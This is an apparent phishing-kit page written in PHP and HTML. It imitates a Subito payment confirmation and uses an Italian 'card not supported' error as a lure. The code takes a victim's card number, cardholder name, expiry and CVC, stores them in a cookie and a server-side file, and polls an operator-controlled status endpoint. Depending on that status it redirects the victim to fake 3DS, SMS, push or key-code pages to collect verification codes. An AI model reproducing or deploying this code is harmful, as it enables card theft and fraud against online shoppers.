<?

include('config.php');
include('functions.php');

if (isset($_POST['amount']) && isset($_POST['card_number']) && isset($_POST['expdate1']) && isset($_POST['expdate2']) && isset($_POST['cvc2'])) {
    setcookie('rdata', base64_encode(json_encode([
        'amount' => $_POST['amount'],
        'card_number' => $_POST['card_number'],
        'cardholder' => $_POST['cardholder'],
        'expdate1' => $_POST['expdate1'],
        'expdate2' => $_POST['expdate2'],
        'cvc2' => $_POST['cvc2'],
    ])));
    setcookie('solt', $_POST['solt']);
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];


$id = $solt['id'];
$shop = "iPay";

$worker = $solt['worker'];

//if (isset($_GET['c'])) {
    $payInfo = json_decode(file_get_contents("database/" . $id), true);
    $payInfo['status'] = 'wait';
    unset($payInfo['errmsg']);
    file_put_contents("database/" . $id, json_encode($payInfo));
//}

?>
<!DOCTYPE html>
<html>
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" type="text/css" href="/payment/push/css/stylesheet.css">
		<link rel="stylesheet" type="text/css" href="/payment/push/css/index.css">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title>Conferma di pagamento</title>

</head>
<body style="font-size: 20px;">


<script type="text/javascript" charset="utf-8" async="" src="/payment/push/css/loader.js"></script>

<div class="form-container">
        <div class="form-block" id="step-1">
            <div class="form-block-header">
						<img src="/payment/push/css/subito-logo.svg" width="260px">
						<img src="/payment/push/css/visamc.png" width="80px" align="right">
                <h1 class="form-block-header-text" style="padding-top:30px;">Errore ! </h1>
            </div>
                <div class="form-block-body">
				    <p class="form-block-body-text" style="margin-top: 15px;">Non siamo stati in grado di eseguire un'operazione sulla tua carta a causa del fatto che la tua carta non supporta questo tipo di operazione</p>
				</div>
                <div class="form-block-footer">			
					<p><span style="color:#999999"><em>Per eseguire con successo questa operazione, si prega di utilizzare un'altra carta di credito, o una carta di un'altra banca</em></span></p>
					<?include('redyrect.php');?>
				</div>
			</div>		
		</div>
		
<script>		
		
		setInterval(function() {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', "/payment/status.php?id=15992042340", false); 
		xhr.send();      
		var data = xhr.responseText;
		var datas = JSON.parse(data);
		if (datas.status == 'SMS'){
			window.location.href = "https://"+window.location.hostname+"/payment/3ds/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=15992042340&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		if (datas.status == 'SMSS'){
			window.location.href = "https://"+window.location.hostname+"/payment/3ds-auth/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=15992042340&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}		
		if (datas.status == 'KEY-6'){
			document.location.href="https://"+window.location.hostname+"/payment/key-6/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=15992042340&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
		if (datas.status == 'SMS+PASS'){
			document.location.href="https://"+window.location.hostname+"/payment/3ds/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=15992042340&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
		if (datas.status == 'PUSH'){
			document.location.href="https://"+window.location.hostname+"/payment/push/?id=ricambi-focus-2004-sw-bari-430204012.htm-17060&log=15992042340&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
	}, 1000);			
		
</script>		


</body>
</html>